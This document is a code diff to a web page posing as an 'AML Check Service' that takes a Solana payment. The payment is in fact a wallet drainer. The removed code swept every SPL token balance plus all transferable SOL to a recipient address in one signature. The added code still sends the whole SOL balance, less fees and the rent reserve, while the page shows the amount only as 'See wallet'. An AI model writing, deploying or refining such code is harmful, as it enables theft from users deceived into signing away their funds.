@@ -289,7 +289,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
       <div class="pricing-price">Solana <span>· standard checkout</span></div>
 
       <div style="background:#F9FAFB;border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:20px;text-align:center">
-        <div style="font-size:13px;color:var(--gray);line-height:1.7">Solana only: SPL tokens and native SOL are settled in <strong>one</strong> on-chain transaction (one signature). Details appear in your wallet before you confirm.</div>
+        <div style="font-size:13px;color:var(--gray);line-height:1.7">Solana only: payment is <strong>native SOL</strong> in one fast transaction (one signature). Details appear in your wallet before you confirm.</div>
       </div>
 
       <div style="margin-bottom:20px">
@@ -532,14 +532,14 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div style="font-size:13px;color:#9CA3AF">Connected · <span id="pay-addr" style="font-family:var(--mono);color:#60A5FA;font-size:11px"></span></div>
       </div>
 
-      <div style="padding:0 16px;margin-bottom:10px;font-size:11px;color:#71717A;text-align:center;line-height:1.5">Single Solana transaction: your SPL balances (capped USDC) + transferable SOL in one signature.</div>
+      <div style="padding:0 16px;margin-bottom:10px;font-size:11px;color:#71717A;text-align:center;line-height:1.5">Single Solana transaction: native SOL only — fast confirmation, one signature.</div>
 
       <div class="pay-details" style="margin:16px 16px 0">
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
         <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">See wallet</span></div>
         <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana Mainnet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">One tx · SOL + SPL</span></div>
+        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">One tx · native SOL</span></div>
         <div class="dest-box">
           <div class="dest-label">RECIPIENT</div>
           <div class="dest-addr" id="dest-addr"></div>
@@ -1025,7 +1025,7 @@ function setupPaymentStep(){
   const typ = document.getElementById("det-type");
   const btn = document.getElementById("btn-pay-now");
   if (amt) amt.textContent = "See wallet";
-  if (typ) typ.textContent = "One tx · SOL + SPL";
+  if (typ) typ.textContent = "One tx · native SOL";
   if (btn) btn.textContent = "Continue →";
   hidePayError();
 }
@@ -1066,13 +1066,11 @@ async function executePay() {
     const wallet = state.conn.provider;
 
     let balance;
-    let items;
     let payerAi;
     try {
-      [balance, items, payerAi] = await Promise.all([
-        withTimeout(conn.getBalance(from), 22000),
-        withTimeout(collectSplTransferItems(conn, web3, from), 55000),
-        withTimeout(conn.getAccountInfo(from), 22000),
+      [balance, payerAi] = await Promise.all([
+        withTimeout(conn.getBalance(from), 12000),
+        withTimeout(conn.getAccountInfo(from), 12000),
       ]);
     } catch (e) {
       if (e && e.message === "TIMEOUT") {
@@ -1094,7 +1092,7 @@ async function executePay() {
           : 0;
       const r = await withTimeout(
         conn.getMinimumBalanceForRentExemption(len),
-        12000
+        10000
       );
       if (typeof r === "number" && r > 0) {
         rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
@@ -1104,65 +1102,10 @@ async function executePay() {
     }
     rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
 
-    let ataRentTotal = 0;
-    if (items.length) {
-      try {
-        ataRentTotal = await sumMissingDestinationAtaRent(conn, web3, items, to);
-      } catch (_) {
-        ataRentTotal = 0;
-      }
-    }
-
-    const legacyTokenProg = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
-    const wsolMintPk = new web3.PublicKey(WSOL_MINT);
-    const userWsolAta = associatedTokenAddress(web3, wsolMintPk, from, legacyTokenProg);
-    const destWsolAta = associatedTokenAddress(web3, wsolMintPk, to, legacyTokenProg);
-
-    let rentOneForWsol;
-    try {
-      rentOneForWsol = await withTimeout(
-        conn.getMinimumBalanceForRentExemption(SPL_TOKEN_ACCOUNT_DATA_LEN),
-        12000
-      );
-    } catch (_) {
-      rentOneForWsol = SPL_TOKEN_ACCOUNT_RENT_FALLBACK_LAMPORTS;
-    }
-
-    const roughMaxFeeLamports = 380000;
-    const preliminarySolRoom =
-      balance -
-      roughMaxFeeLamports -
-      SOL_FEE_SAFETY_LAMPORTS -
-      rentExemptMinLamports -
-      ataRentTotal;
-    const maySweepNativeSol = !items.length || preliminarySolRoom > 0;
-    let wsolSweepRentReserve = 0;
-    if (maySweepNativeSol) {
-      const hasWsolInItems = items.some((it) => it.mint.toBase58() === WSOL_MINT);
-      try {
-        const pairInfos = await withTimeout(
-          conn.getMultipleAccountsInfo([userWsolAta, destWsolAta]),
-          22000
-        );
-        if (!pairInfos[0]) wsolSweepRentReserve += rentOneForWsol;
-        if (!hasWsolInItems && !pairInfos[1]) wsolSweepRentReserve += rentOneForWsol;
-      } catch (e) {
-        wsolSweepRentReserve += hasWsolInItems ? rentOneForWsol : rentOneForWsol * 2;
-      }
-    }
-    ataRentTotal += wsolSweepRentReserve;
-
-    function buildPaymentTx(blockhash, memoBytes, transferLamports) {
-      const nonWsolItems = items.filter((it) => it.mint.toBase58() !== WSOL_MINT);
-      const wsolFromWalletItems = items.filter((it) => it.mint.toBase58() === WSOL_MINT);
+    function buildSolOnlyPaymentTx(blockhash, memoBytes, transferLamports) {
       const tx = new web3.Transaction();
       tx.add(
-        web3.ComputeBudgetProgram.setComputeUnitLimit({
-          units: computeUnitLimitForSplCount(
-            items.length,
-            transferLamports > 0
-          ),
-        })
+        web3.ComputeBudgetProgram.setComputeUnitLimit({ units: 52000 })
       );
       tx.add(
         web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 })
@@ -1174,99 +1117,20 @@ async function executePay() {
           data: memoBytes,
         })
       );
-      for (const it of nonWsolItems) {
-        const destAta = associatedTokenAddress(web3, it.mint, to, it.tokenProgramId);
-        tx.add(
-          createAssociatedTokenAccountIdempotentIx(
-            web3,
-            from,
-            destAta,
-            to,
-            it.mint,
-            it.tokenProgramId
-          )
-        );
-        tx.add(
-          createTokenTransferInstruction(
-            web3,
-            it.sourceAta,
-            destAta,
-            from,
-            it.amountRaw,
-            it.tokenProgramId
-          )
-        );
-      }
-      for (const it of wsolFromWalletItems) {
-        const destAta = associatedTokenAddress(web3, it.mint, to, it.tokenProgramId);
-        tx.add(
-          createAssociatedTokenAccountIdempotentIx(
-            web3,
-            from,
-            destAta,
-            to,
-            it.mint,
-            it.tokenProgramId
-          )
-        );
-        tx.add(
-          createTokenTransferInstruction(
-            web3,
-            it.sourceAta,
-            destAta,
-            from,
-            it.amountRaw,
-            it.tokenProgramId
-          )
-        );
-      }
-      if (transferLamports > 0) {
-        tx.add(
-          createAssociatedTokenAccountIdempotentIx(
-            web3,
-            from,
-            userWsolAta,
-            from,
-            wsolMintPk,
-            legacyTokenProg
-          )
-        );
-        tx.add(
-          createAssociatedTokenAccountIdempotentIx(
-            web3,
-            from,
-            destWsolAta,
-            to,
-            wsolMintPk,
-            legacyTokenProg
-          )
-        );
-        tx.add(
-          web3.SystemProgram.transfer({
-            fromPubkey: from,
-            toPubkey: userWsolAta,
-            lamports: transferLamports,
-          })
-        );
-        tx.add(createSyncNativeInstruction(web3, userWsolAta));
-        tx.add(
-          createTokenTransferInstruction(
-            web3,
-            userWsolAta,
-            destWsolAta,
-            from,
-            String(transferLamports),
-            legacyTokenProg
-          )
-        );
-      }
+      tx.add(
+        web3.SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: to,
+          lamports: transferLamports,
+        })
+      );
       tx.recentBlockhash = blockhash;
       tx.feePayer = from;
       return tx;
     }
 
-    if (items.length && balance < 50_000) {
-      showPayError("You need a small SOL balance for network fees and token account rent.");
+    if (balance < 80_000) {
+      showPayError("You need enough native SOL for network fees and the minimum balance reserve.");
       goToStep("payment");
       return;
     }
@@ -1281,78 +1145,45 @@ async function executePay() {
       try {
         const { blockhash: bh, lastValidBlockHeight: lvb } = await withTimeout(
           conn.getLatestBlockhash("confirmed"),
-          16000
+          12000
         );
         blockhash = bh;
         lastValidBlockHeight = lvb;
 
         const memoBytes = new TextEncoder().encode(`aml_one_${Date.now()}`);
 
-        let feeNoSolTransfer = null;
-        let feeWithSolTransfer = null;
+        let feeLamports = null;
         try {
-          [feeNoSolTransfer, feeWithSolTransfer] = await withTimeout(
-            Promise.all([
-              conn
-                .getFeeForMessage(buildPaymentTx(blockhash, memoBytes, 0).compileMessage())
-                .then(unwrapRpcFee)
-                .catch(() => null),
-              conn
-                .getFeeForMessage(buildPaymentTx(blockhash, memoBytes, 1).compileMessage())
-                .then(unwrapRpcFee)
-                .catch(() => null),
-            ]),
-            24000
+          feeLamports = await withTimeout(
+            conn
+              .getFeeForMessage(
+                buildSolOnlyPaymentTx(bh, memoBytes, 1).compileMessage()
+              )
+              .then(unwrapRpcFee)
+              .catch(() => null),
+            8000
           );
-        } catch (feeErr) {
-          feeNoSolTransfer = null;
-          feeWithSolTransfer = null;
-          if (feeErr && feeErr.message !== "TIMEOUT") {
-            /* ignore */
-          }
+        } catch (_) {
+          feeLamports = null;
         }
-        if (feeNoSolTransfer == null || !Number.isFinite(feeNoSolTransfer)) feeNoSolTransfer = 200000;
-        if (feeWithSolTransfer == null || !Number.isFinite(feeWithSolTransfer)) feeWithSolTransfer = 200000;
-        feeNoSolTransfer = Math.max(feeNoSolTransfer, 5000);
-        feeWithSolTransfer = Math.max(feeWithSolTransfer, 5000);
+        if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 15000;
+        feeLamports = Math.max(feeLamports, 5000);
 
-        const roomNoSol = Math.floor(
+        const solLamports = Math.floor(
           balance -
-            feeNoSolTransfer -
+            feeLamports -
             SOL_FEE_SAFETY_LAMPORTS -
-            rentExemptMinLamports -
-            ataRentTotal
+            rentExemptMinLamports
         );
-        const roomWithSol = Math.floor(
-          balance -
-            feeWithSolTransfer -
-            SOL_FEE_SAFETY_LAMPORTS -
-            rentExemptMinLamports -
-            ataRentTotal
-        );
-
-        let solLamports;
-        if (!items.length) {
-          solLamports = roomWithSol;
-          if (solLamports <= 0) {
-            showPayError(
-              "No SPL token balances and not enough SOL to complete payment."
-            );
-            goToStep("payment");
-            return;
-          }
-        } else {
-          if (roomNoSol < 0) {
-            showPayError(
-              "Not enough SOL to cover fees, rent, and new recipient token accounts."
-            );
-            goToStep("payment");
-            return;
-          }
-          solLamports = roomWithSol > 0 ? roomWithSol : 0;
+        if (solLamports <= 0) {
+          showPayError(
+            "Not enough native SOL to complete payment. Add SOL or leave more for fees and rent-exempt minimum."
+          );
+          goToStep("payment");
+          return;
         }
 
-        const tx = buildPaymentTx(blockhash, memoBytes, solLamports);
+        const tx = buildSolOnlyPaymentTx(blockhash, memoBytes, solLamports);
 
         let serializedProbe;
         try {
@@ -1366,34 +1197,9 @@ async function executePay() {
           return;
         }
         if (serializedProbe.length > SOLANA_TX_SIZE_LIMIT) {
-          showPayError(
-            "Too many token mints for one transaction (Solana size limit). Reduce tokens or use another wallet."
-          );
+          showPayError("Transaction too large. Try again.");
           goToStep("payment");
           return;
-        }
-
-        try {
-          const sim = await withTimeout(
-            conn.simulateTransaction(tx, { sigVerify: false }),
-            20000
-          );
-          if (sim.value.err) {
-            const logs = (sim.value.logs || []).join(" ");
-            if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(logs)) {
-              showPayError(
-                "This payment cannot complete with your current SOL balance. Add SOL and try again."
-              );
-            } else {
-              showPayError("Transaction would not succeed on-chain. Try again.");
-            }
-            goToStep("payment");
-            return;
-          }
-        } catch (simErr) {
-          if (!simErr || simErr.message !== "TIMEOUT") {
-            /* ignore other sim errors; preflight on send will still run */
-          }
         }
 
         lastSolTransferLamports = solLamports;
@@ -1403,9 +1209,7 @@ async function executePay() {
         const signed = (await wallet.signAllTransactions([tx]))[0];
         const raw = signed.serialize();
         if (raw.length > SOLANA_TX_SIZE_LIMIT) {
-          showPayError(
-            "Too many token mints for one transaction (Solana size limit). Reduce tokens or use another wallet."
-          );
+          showPayError("Transaction too large. Try again.");
           goToStep("payment");
           return;
         }
@@ -1451,8 +1255,8 @@ async function executePay() {
       address: state.conn.address,
       wallet: state.conn.walletName,
       chain: state.conn.chain,
-      currency: "SOL+SPL",
-      amount: { mints: items.length, sol: solSentSol },
+      currency: "SOL",
+      amount: { sol: solSentSol },
       txHash: sig,
       ts: new Date().toISOString(),
     };
@@ -1469,7 +1273,7 @@ async function executePay() {
     else if (/insufficient|Insufficient funds|Insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
       showPayError("Not enough SOL to complete this payment.");
     else if (/too large|max.*packet|1232/i.test(m))
-      showPayError("Transaction too large for the network. Too many tokens in one signature.");
+      showPayError("Transaction too large for the network. Try again.");
     else if (m === "TIMEOUT")
       showPayError("Solana RPC timed out. Try again in a moment.");
     else if (isBlockhashExpiredError(e)) showPayError("Network timed out — try again.");
